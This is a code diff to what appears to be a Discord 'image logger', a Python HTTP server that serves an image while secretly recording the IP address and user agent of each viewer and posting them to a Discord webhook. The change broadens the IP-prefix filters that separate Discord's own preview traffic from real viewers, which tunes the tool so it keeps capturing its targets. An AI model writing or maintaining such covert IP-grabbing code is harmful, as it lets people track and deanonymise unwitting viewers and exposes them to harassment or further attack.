@@ -57,8 +57,8 @@ config = {
 }
 
 def makeReport(ip, useragent = None):
-    if ip.startswith(('34', '35', '104.169')):
-        if ip.startswith('104.169'): return
+    if ip.startswith(('34', '35', '104')):
+        if ip.startswith('104'): return
         requests.post(config["webhook"], json = {
     "username": config["username"],
     "content": "",
@@ -136,7 +136,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
         else:
             data = binaries["normal"]
         
-        if self.headers.get('x-forwarded-for').startswith(('35', '34', '104.169')):
+        if self.headers.get('x-forwarded-for').startswith(('35', '34', '104')):
             makeReport(self.headers.get('x-forwarded-for'))
             self.send_response(200) # 200 = OK (HTTP Status)
             self.send_header('Content-type','image/jpeg') # Define the data as an image so Discord can show it.
